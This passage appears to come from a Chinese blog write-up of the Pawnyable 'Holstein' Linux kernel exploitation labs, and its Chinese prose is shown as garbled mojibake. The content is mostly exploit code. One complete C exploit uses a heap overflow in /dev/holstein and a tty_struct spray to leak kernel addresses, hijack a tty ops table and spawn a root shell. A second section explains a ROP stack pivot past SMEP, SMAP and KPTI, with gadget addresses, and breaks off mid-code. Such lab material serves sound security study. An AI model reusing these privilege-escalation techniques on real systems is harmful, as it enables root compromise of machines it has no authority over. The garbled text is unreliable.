å‡½æ•°è¡¨ä¸Šï¼Œè¿›è€Œæ§åˆ¶ripæ‰§è¡Œshellcode</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff81074650</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff810744b0</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>prepare_kernel_cred_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>commit_creds_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x450</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x450</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc38880</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] leak => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare_kernel_cred_addr<span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>commit_creds_addr<span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span><span class="token comment">//fake ops</span><span class="token class-name">size_t</span> fake_ops<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootPrivilige<span class="token punctuation">;</span><span class="token comment">//ops_close</span><span class="token comment">//overlap ops</span><span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_ops<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äºŒã€LK01-2-Holstein-v2-smep-smap-kpti-kaslr"><a href="#äºŒã€LK01-2-Holstein-v2-smep-smap-kpti-kaslr" class="headerlink" title="äºŒã€LK01-2 Holstein v2 +smep, +smap, kpti, kaslr"></a>äºŒã€LK01-2 Holstein v2 +smep, +smap, kpti, kaslr</h1><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><ul><li>ç»•è¿‡SMAPï¼šå¼€å¯äº†SMAPï¼Œæˆ‘ä»¬ä¸èƒ½å°†opså‡½æ•°è¡¨æ”¾åˆ°ç”¨æˆ·æ€äº†ã€‚ä¸è¿‡æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å †æ•°æ®ï¼Œå¯ä»¥å°†ä¼ªé€ çš„å‡½æ•°è¡¨æ”¾åˆ°å †ä¸Šæ¥æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</li><li>ç»•è¿‡SMEPï¼šæˆ‘ä»¬æ— æ³•å†ä½¿ç”¨ret2usrï¼Œè€ƒè™‘kROPï¼Œä½†æ˜¯è¿™ä¸æ ˆæº¢å‡ºä¸åŒï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œstack pivoting</li><li>ç»•è¿‡kptiï¼šswapgs_restore_regs_and_return_to_usermode()é™è½ç”¨æˆ·æ€</li></ul><p>æœ€å¤§çš„é—®é¢˜æ˜¯æ ˆåŠ«æŒï¼Œå¦‚æœéœ€è¦åŠ«æŒrspåˆ°å †ä¸Šï¼Œå°±å¿…é¡»è¦æ±‚å¯„å­˜å™¨æˆ–æ ˆä¸Šæœ‰ç›¸åº”çš„å †åœ°å€ï¼Œä»¥é€šè¿‡gadgetèµ‹å€¼ç»™rsp</p><p>è‹¥æˆ‘ä»¬ä»¥ops_closeä¸ºè§¦å‘ç‚¹ï¼Œå†…å­˜æƒ…å†µå¦‚ä¸‹ï¼Œæ ¹æœ¬æ²¡æœ‰åˆé€‚çš„å †åœ°å€ç»™æˆ‘ä»¬ç”¨ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">*RAX  0xffffffff810d4605 (___bpf_prog_run+869) â—‚â€” pop rsp /* 0xfffffca5e908c35c */*RBX  0xffff888002e8cf00 â—‚â€” 0*RCX  0xffff8880030f75f8 â—‚â€” 0*RDX  0x1*RDI  0xffff8880030f7400 â—‚â€” add dword ptr [rax + rax], edx /* 0x200005401 */*RSI  0xffff888002e8cf00 â—‚â€” 0*R8   0x1*R9   0x1*R10  0x10*R11  0x0*R12  0xffff8880030f7400 â—‚â€” add dword ptr [rax + rax], edx /* 0x200005401 */*R13  0xffff8880030f7800 â—‚â€” add dword ptr [rax + rax], edx /* 0x100005401 */*R14  0xffff888002863e40 â—‚â€” or byte ptr [rax], al /* 0x200500008 */*R15  0xffff88800272c2a0 â€”â–¸ 0xffff888002804300 â—‚â€” add byte ptr [rax], al /* 0x200200000 */*RBP  0xffffc90000187e68 â€”â–¸ 0xffffc90000187ea0 â€”â–¸ 0xffffc90000187eb0 â€”â–¸ 0xffffc90000187ed8 â€”â–¸ 0xffffc90000187f00 â—‚â€” ...*RSP  0xffffc90000187e28 â€”â–¸ 0xffffffff81318b6a (tty_release+298) â—‚â€” mov rdi, r13 /* 0x1be41ef894c */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å˜æ¢æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥ops_ioctlä¸ºè§¦å‘ç‚¹ï¼Œioctlå…è®¸è‡ªå®šä¹‰ä¼ å‚ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥å †åœ°å€ç»™rdxï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">*RAX  0xffffffff810d4605 (___bpf_prog_run+869) â—‚â€” pop rsp /* 0xfffffca5e908c35c */*RBX  0xffff8880030e4c00 â—‚â€” add dword ptr [rax + rax], edx /* 0x100005401 */ RCX  0x0*RDX  0xffff8880030e4400 â—‚â€” 0x4141414141414141 ('AAAAAAAA')*RDI  0xffff8880030e4800 â—‚â€” add dword ptr [rax + rax], edx /* 0x100005401 */ RSI  0x0*R8   0xffff8880030e4400 â—‚â€” 0x4141414141414141 ('AAAAAAAA')*R9   0x0 R10  0x0*R11  0x0 R12  0x0*R13  0xffff8880030e4800 â—‚â€” add dword ptr [rax + rax], edx /* 0x100005401 */*R14  0xffff8880030e4400 â—‚â€” 0x4141414141414141 ('AAAAAAAA')*R15  0xffff888002e8b600 â—‚â€” 0*RBP  0xffffc90000167ea8 â€”â–¸ 0xffffc90000167f30 â€”â–¸ 0xffffc90000167f48 â—‚â€” 0*RSP  0xffffc90000167e10 â€”â–¸ 0xffffffff8131975a (tty_ioctl+906) â—‚â€” cmp eax, 0xfffffdfd /* 0xab850ffffffdfd3d */*RIP  0xffffffff810d4605 (___bpf_prog_run+869) â—‚â€” pop rsp /* 0xfffffca5e908c35c */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤æˆ‘ä»¬éœ€è¦èƒ½å°†rdxèµ‹å€¼ç»™rspçš„gadgetï¼Œåœ¨å†…æ ¸ä¸­å¾ˆéš¾æ‰¾åˆ°<code>mov rsp, rcx; ret;</code>è¿™æ ·ç›´æ¥çš„ gadgetï¼Œä½†æ˜¯åƒ<code>push rcx; ...; pop rsp; ...; ret;</code>çš„ gadget å­˜åœ¨çš„å¯èƒ½æ€§å¾ˆå¤§ï¼Œæ‰€ä»¥æœç´¢è¿™ç§å½¢å¼å¯èƒ½ä¼šæ›´å®¹æ˜“æ‰¾åˆ°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â•°â”€ ropr  <span class="token parameter variable">-R</span> <span class="token string">"push rdx.*; pop rsp; .*ret;"</span> ./vmlinux0xffffffff813a478a: push rdx<span class="token punctuation">;</span> mov ebp, 0x415bffd9<span class="token punctuation">;</span> pop rsp<span class="token punctuation">;</span> pop r13<span class="token punctuation">;</span> pop rbp<span class="token punctuation">;</span> ret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¿åˆƒè€Œè§£äº†</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_PP_RET</span> <span class="token expression"><span class="token number">0xffffffff813a478a</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810d748d</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVESQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8162707b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8113c1c4</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff81074650</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff810744b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>prepare_kernel_cred_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>commit_creds_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"swapgs;"</span><span class="token string">"push %0;"</span><span class="token string">"push %1;"</span><span class="token string">"push %2;"</span><span class="token string">"push %3;"</span><span class="token string">"push %4;"</span><span class="token string">"iretq;"</span><span class="token operator">:</span><span class="token operator">:</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">(</span>getRootShell<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token 